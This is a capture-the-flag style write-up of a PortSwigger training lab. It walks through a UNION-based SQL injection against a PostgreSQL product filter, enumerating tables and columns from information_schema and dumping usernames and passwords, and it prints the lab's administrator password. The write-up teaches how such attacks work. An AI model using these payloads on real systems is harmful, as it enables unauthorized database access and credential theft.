# SQL injection attack, listing the database contents on non-Oracle databases

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle), you'll learn: SQL injection attack, listing the database contents on non-Oracle databases! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205063122.png)

**In the previous labs, we found an SQL injection vulnerability in the product category filter:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205063233.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205063256.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205063343.png)

And we found **there are 2 columns in the current table, and both columns are accepting string data type.**

**To extract the username and password of all users, I'll:**

- Find out which DBMS(Database Management System) and it's version:

```sql
' UNION SELECT NULL,version()-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205063458.png)

- DBMS information: PostgreSQL version 12.12

Then we can list all the table names.

- List all the table names:

```sql
' UNION SELECT NULL,table_name FROM information_schema.tables-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205065438.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205065449.png)

That's way too many tables. Let's **exclude all the `pg` tables, which is the PostgreSQL default tables.**

- Excluding `pg` tables:

```sql
' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_name NOT LIKE '%pg%'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205065559.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205065617.png)

After some filtering, I found the `users_zmlpng` table look sussy. Let's **list all column names of this table**.

- List all column names of table `users_zmlpng`:
```sql
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users_zmlpng'-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205065749.png)

It has 2 columns: `username_hrympe` and `password_gxucte`. Let's extract those data!

- Extracting table `users_zmlpng` data:

```sql
' UNION SELECT NULL,username_hrympe||':'||password_gxucte FROM users_zmlpng-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205065910.png)

We found `administrator` password!

- Username: administrator
- Password: 5eg7nhvdr5aag5h4n4i4

**Let's login as `administrator`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205065956.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-9/images/Pasted%20image%2020221205070008.png)

We're user `administrator`!!

# What we've learned:

1. SQL injection attack, listing the database contents on non-Oracle databases